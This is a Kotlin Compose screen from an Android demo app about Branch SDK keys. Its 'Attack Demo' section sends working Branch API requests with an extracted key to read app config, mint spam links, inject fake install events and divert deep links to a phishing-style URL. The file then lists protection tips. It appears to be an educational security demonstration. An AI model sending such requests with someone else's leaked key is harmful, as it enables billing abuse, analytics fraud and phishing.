package com.abhay.firebasekeys

import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.ColumnScope
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import io.branch.indexing.BranchUniversalObject
import io.branch.referral.util.ContentMetadata
import io.branch.referral.util.LinkProperties
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

object DeepLinkState {
    var lastParams by mutableStateOf<String?>(null)
    var lastError  by mutableStateOf<String?>(null)
}

@Composable
fun BranchScreen(modifier: Modifier = Modifier) {
    val context   = LocalContext.current
    val scope     = rememberCoroutineScope()
    val http      = remember { OkHttpClient() }
    val branchKey = NativeKeys.getBranchKey()

    // Generate link state
    var generatedLink by remember { mutableStateOf<String?>(null) }
    var linkError     by remember { mutableStateOf<String?>(null) }
    var isGenerating  by remember { mutableStateOf(false) }

    // Region toggle
    var useEuEndpoint by remember { mutableStateOf(false) }
    val baseUrl = if (useEuEndpoint) "https://api3-eu.branch.io" else "https://api2.branch.io"

    // Attack demo state
    var attackResult  by remember { mutableStateOf<String?>(null) }
    var attackLabel   by remember { mutableStateOf("") }  // which attack is running
    var isAttacking   by remember { mutableStateOf(false) }

    fun runAttack(label: String, url: String, payload: String?) {
        scope.launch {
            isAttacking  = true
            attackLabel  = label
            attackResult = null
            try {
                val resp = withContext(Dispatchers.IO) {
                    val req = Request.Builder().url(url).apply {
                        if (payload != null)
                            post(payload.toRequestBody("application/json".toMediaType()))
                        else
                            get()
                    }.build()
                    http.newCall(req).execute()
                }
                val body = resp.body?.string() ?: "(empty)"
                attackResult = "HTTP ${resp.code}\n" +
                    runCatching { JSONObject(body).toString(2) }.getOrDefault(body)
            } catch (e: Exception) {
                attackResult = "Error: ${e.message}"
            } finally {
                isAttacking = false
            }
        }
    }

    Column(
        modifier = modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Text("Branch SDK", fontSize = 20.sp, fontWeight = FontWeight.Bold)

        // ── Key info ──────────────────────────────────────────────────────────
        BSection("Key stored in NDK (libkeys.so)", Color(0xFF1565C0), Color(0xFFE3F2FD)) {
            Text("XOR-obfuscated in keys.cpp — no plaintext in dex or resources.",
                fontSize = 13.sp, color = Color(0xFF0D47A1))
            Spacer(Modifier.height(6.dp))
            BKeyRow("branch_key", branchKey)
            BKeyRow("key length", "${branchKey.length} chars")
        }

        // ── SDK Status ────────────────────────────────────────────────────────
        BSection("SDK Status", Color(0xFF2E7D32), Color(0xFFE8F5E9)) {
            BInfoRow("Initialised via",        "App.onCreate()")
            BInfoRow("Session started in",     "MainActivity.onStart()")
            BInfoRow("Re-init on new intent",  "MainActivity.onNewIntent()")
            BInfoRow("Deep link scheme",       "firebasekeys://open")
            BInfoRow("App link host",          "firebasekeys.app.link")
        }

        // ── Generate deep link ────────────────────────────────────────────────
        BSection("Generate Deep Link", Color(0xFF6A1B9A), Color(0xFFF3E5F5)) {
            Text("Creates a Branch Universal Object and generates a short link via the SDK.",
                fontSize = 13.sp, color = Color(0xFF4A148C))
            Spacer(Modifier.height(8.dp))
            Button(
                onClick = {
                    isGenerating  = true
                    generatedLink = null
                    linkError     = null
                    val buo = BranchUniversalObject()
                        .setCanonicalIdentifier("demo/map-features")
                        .setTitle("FirebaseKeys — Map Features Demo")
                        .setContentDescription("Google Maps billing demo")
                        .setContentMetadata(
                            ContentMetadata()
                                .addCustomMetadata("sdk", "branch")
                                .addCustomMetadata("screen", "map")
                        )
                    val lp = LinkProperties()
                        .setChannel("app")
                        .setFeature("share")
                        .addControlParameter(
                            "\$desktop_url",
                            "https://github.com/abhaypratap6464/FirebaseKeys"
                        )
                    buo.generateShortUrl(context, lp) { url, error ->
                        isGenerating = false
                        if (error != null) linkError = error.message
                        else generatedLink = url
                    }
                },
                enabled = !isGenerating,
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6A1B9A))
            ) {
                if (isGenerating) CircularProgressIndicator(
                    Modifier.size(14.dp), strokeWidth = 2.dp, color = Color.White
                )
                else Text("Generate Short Link")
            }
            generatedLink?.let {
                Spacer(Modifier.height(8.dp))
                Text("Generated link:", fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                BCodeBoxWithCopy(it)
            }
            linkError?.let {
                Spacer(Modifier.height(6.dp))
                Text("Error: $it", fontSize = 12.sp, color = Color(0xFFD32F2F))
            }
        }

        // ── Attack demo ───────────────────────────────────────────────────────
        BSection("⚠ Key Exposure — Attack Demo", Color(0xFFB71C1C), Color(0xFFFFEBEE)) {
            Text(
                "An attacker who extracts the key from your APK can call the Branch " +
                "REST API directly — no SDK, no app install needed.",
                fontSize = 12.sp, color = Color(0xFF7F0000)
            )
            Spacer(Modifier.height(8.dp))
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFFFFCDD2), RoundedCornerShape(6.dp))
                    .padding(horizontal = 10.dp, vertical = 4.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Text(
                    text = if (useEuEndpoint) "EU  api3-eu.branch.io" else "US  api2.branch.io",
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace,
                    color = Color(0xFF7F0000)
                )
                Switch(
                    checked = useEuEndpoint,
                    onCheckedChange = { useEuEndpoint = it; attackResult = null },
                    colors = SwitchDefaults.colors(
                        checkedThumbColor   = Color(0xFFB71C1C),
                        checkedTrackColor   = Color(0xFFEF9A9A),
                        uncheckedThumbColor = Color(0xFF7F0000),
                        uncheckedTrackColor = Color(0xFFEF9A9A)
                    )
                )
            }
            Spacer(Modifier.height(10.dp))

            AttackButton(
                label       = "Attack 1: Read App Config",
                description = "GET /v1/app/{key}  — leaks app name, creation date, store URLs",
                isRunning   = isAttacking && attackLabel == "config",
                color       = Color(0xFFD32F2F)
            ) {
                runAttack(
                    label   = "config",
                    url     = "$baseUrl/v1/app/$branchKey",
                    payload = null
                )
            }

            Spacer(Modifier.height(8.dp))

            AttackButton(
                label       = "Attack 2: Create Spam Link",
                description = "POST /v1/url  — mints a real Branch link billed to your account",
                isRunning   = isAttacking && attackLabel == "spam",
                color       = Color(0xFFE65100)
            ) {
                runAttack(
                    label   = "spam",
                    url     = "$baseUrl/v1/url",
                    payload = """
                        {
                          "branch_key": "$branchKey",
                          "channel":  "attacker",
                          "feature":  "spam",
                          "campaign": "malicious_campaign",
                          "data": {
                            "${'$'}og_title":       "Free Prize! Click Now",
                            "${'$'}og_description": "Attacker-controlled link via exposed key",
                            "${'$'}desktop_url":    "https://example.com/attacker"
                          }
                        }
                    """.trimIndent()
                )
            }

            Spacer(Modifier.height(8.dp))

            AttackButton(
                label       = "Attack 3: Attribution Fraud",
                description = "POST /v2/event/standard  — injects a fake INSTALL event, poisons analytics",
                isRunning   = isAttacking && attackLabel == "fraud",
                color       = Color(0xFF6A1B9A)
            ) {
                runAttack(
                    label   = "fraud",
                    url     = "$baseUrl/v2/event/standard",
                    payload = """
                        {
                          "branch_key": "$branchKey",
                          "name": "INSTALL",
                          "user_data": {
                            "os":          "ANDROID",
                            "app_version": "9.9.9",
                            "developer_identity": "fake_${System.currentTimeMillis()}"
                          },
                          "custom_data": {
                            "fraud_note": "Fake install via exposed Branch key"
                          }
                        }
                    """.trimIndent()
                )
            }

            Spacer(Modifier.height(8.dp))

            AttackButton(
                label       = "Attack 4: Divert Deep Link",
                description = "POST /v1/url  — crafts a link that routes victims to attacker-controlled content inside your app",
                isRunning   = isAttacking && attackLabel == "divert",
                color       = Color(0xFF1565C0)
            ) {
                runAttack(
                    label   = "divert",
                    url     = "$baseUrl/v1/url",
                    payload = """
                        {
                          "branch_key": "$branchKey",
                          "channel":  "attacker",
                          "feature":  "divert",
                          "data": {
                            "${'$'}deeplink_path":  "map?lat=28.6139&lng=77.2090&poi=attacker_poi",
                            "${'$'}desktop_url":    "https://example.com/phishing",
                            "${'$'}og_title":       "Check out this location!",
                            "${'$'}og_description": "Attacker-diverted deep link via exposed key",
                            "attacker_note":    "victim routed to attacker-controlled path"
                          }
                        }
                    """.trimIndent()
                )
            }

            attackResult?.let {
                Spacer(Modifier.height(10.dp))
                Text("Response:", fontSize = 11.sp,
                    fontWeight = FontWeight.SemiBold, color = Color(0xFF7F0000))
                BCodeBoxWithCopy(it)
            }

            Spacer(Modifier.height(8.dp))
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFFFFF3E0), RoundedCornerShape(6.dp))
                    .padding(10.dp)
            ) {
                Text("How to protect your Branch key",
                    fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFE65100))
                Spacer(Modifier.height(4.dp))
                listOf(
                    "Enable bundle-ID lock in Branch dashboard",
                    "Rotate the key immediately if you suspect exposure",
                    "Store key in NDK — never in strings.xml or BuildConfig",
                    "Monitor Branch dashboard for unusual link creation spikes",
                ).forEachIndexed { i, tip ->
                    Text("${i + 1}. $tip", fontSize = 11.sp, color = Color(0xFF7F3B00),
                        modifier = Modifier.padding(top = 2.dp))
                }
            }
        }

        // ── Received deep link ────────────────────────────────────────────────
        BSection("Received Deep Link Params", Color(0xFF1565C0), Color(0xFFE3F2FD)) {
            Text(
                "Parameters delivered by Branch when this app session was opened. " +
                "If opened via a diverted link, attacker-injected data appears here.",
                fontSize = 12.sp, color = Color(0xFF0D47A1)
            )
            Spacer(Modifier.height(8.dp))
            when {
                DeepLinkState.lastError != null ->
                    Text("Error: ${DeepLinkState.lastError}",
                        fontSize = 11.sp, color = Color(0xFFD32F2F))
                DeepLinkState.lastParams != null ->
                    BCodeBoxWithCopy(DeepLinkState.lastParams!!)
                else ->
                    Text("No deep link this session — open app via a Branch link to see params.",
                        fontSize = 11.sp, color = Color(0xFF546E7A),
                        fontFamily = FontFamily.Monospace)
            }
        }

        // ── Deferred deep linking explainer ───────────────────────────────────
        BSection("How Deferred Deep Linking Works", Color(0xFF37474F), Color(0xFFECEFF1)) {
            listOf(
                "1" to "User clicks a Branch link before the app is installed.",
                "2" to "Branch fingerprints the device and stores the link data.",
                "3" to "User installs and opens the app for the first time.",
                "4" to "Branch.sessionBuilder().init() is called in onStart().",
                "5" to "Branch SDK returns the original link params — even on first open.",
            ).forEach { (n, desc) ->
                Row(
                    modifier = Modifier.fillMaxWidth().padding(vertical = 3.dp),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Text(n, fontSize = 12.sp, fontWeight = FontWeight.Bold,
                        fontFamily = FontFamily.Monospace, color = Color(0xFF263238))
                    Text(desc, fontSize = 12.sp, color = Color(0xFF37474F))
                }
            }
        }
    }
}

// ── Private composables ───────────────────────────────────────────────────────

@Composable
private fun BSection(
    title: String,
    borderColor: Color,
    bgColor: Color,
    content: @Composable ColumnScope.() -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxWidth()
            .border(1.5.dp, borderColor, RoundedCornerShape(8.dp))
            .background(bgColor, RoundedCornerShape(8.dp))
            .padding(12.dp),
        content = {
            Text(title, fontWeight = FontWeight.Bold, fontSize = 14.sp, color = borderColor)
            Spacer(Modifier.height(8.dp))
            content()
        }
    )
}

@Composable
private fun AttackButton(
    label: String,
    description: String,
    isRunning: Boolean,
    color: Color,
    onClick: () -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxWidth()
            .border(1.dp, color.copy(alpha = 0.4f), RoundedCornerShape(6.dp))
            .background(color.copy(alpha = 0.06f), RoundedCornerShape(6.dp))
            .padding(8.dp)
    ) {
        Text(description, fontSize = 10.sp, color = color, fontFamily = FontFamily.Monospace)
        Spacer(Modifier.height(6.dp))
        Button(
            onClick  = onClick,
            enabled  = !isRunning,
            colors   = ButtonDefaults.buttonColors(containerColor = color),
            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
        ) {
            if (isRunning) {
                CircularProgressIndicator(Modifier.size(12.dp), strokeWidth = 2.dp, color = Color.White)
                Spacer(Modifier.width(6.dp))
            }
            Text(if (isRunning) "Running…" else label, fontSize = 11.sp)
        }
    }
}

@Composable
private fun BKeyRow(name: String, value: String) {
    Row(modifier = Modifier.fillMaxWidth().padding(vertical = 2.dp),
        horizontalArrangement = Arrangement.SpaceBetween) {
        Text(name, fontSize = 12.sp, fontFamily = FontFamily.Monospace, color = Color.DarkGray)
        Text(
            text = if (value.length > 26) value.take(26) + "…" else value,
            fontSize = 12.sp, fontFamily = FontFamily.Monospace, color = Color(0xFF1565C0)
        )
    }
}

@Composable
private fun BInfoRow(label: String, value: String) {
    Row(modifier = Modifier.fillMaxWidth().padding(vertical = 2.dp),
        horizontalArrangement = Arrangement.SpaceBetween) {
        Text(label, fontSize = 12.sp, color = Color.DarkGray)
        Text(value, fontSize = 12.sp, fontFamily = FontFamily.Monospace,
            fontWeight = FontWeight.Medium)
    }
}

@Composable
private fun BCodeBoxWithCopy(text: String) {
    val clipboard = LocalClipboardManager.current
    var copied by remember { mutableStateOf(false) }

    LaunchedEffect(copied) {
        if (copied) { delay(2000); copied = false }
    }

    Row(
        modifier = Modifier
            .fillMaxWidth()
            .background(Color(0xFF212121), RoundedCornerShape(4.dp))
            .padding(start = 8.dp, top = 4.dp, bottom = 4.dp, end = 4.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Text(text, fontSize = 11.sp, fontFamily = FontFamily.Monospace,
            color = Color(0xFF80FF80), modifier = Modifier.weight(1f))
        IconButton(
            onClick = { clipboard.setText(AnnotatedString(text)); copied = true },
            modifier = Modifier.size(32.dp)
        ) {
            Icon(
                imageVector = if (copied) Icons.Default.Check else Icons.Default.ContentCopy,
                contentDescription = if (copied) "Copied" else "Copy",
                tint = if (copied) Color(0xFF80FF80) else Color(0xFFAAAAAA),
                modifier = Modifier.size(16.dp)
            )
        }
    }
}
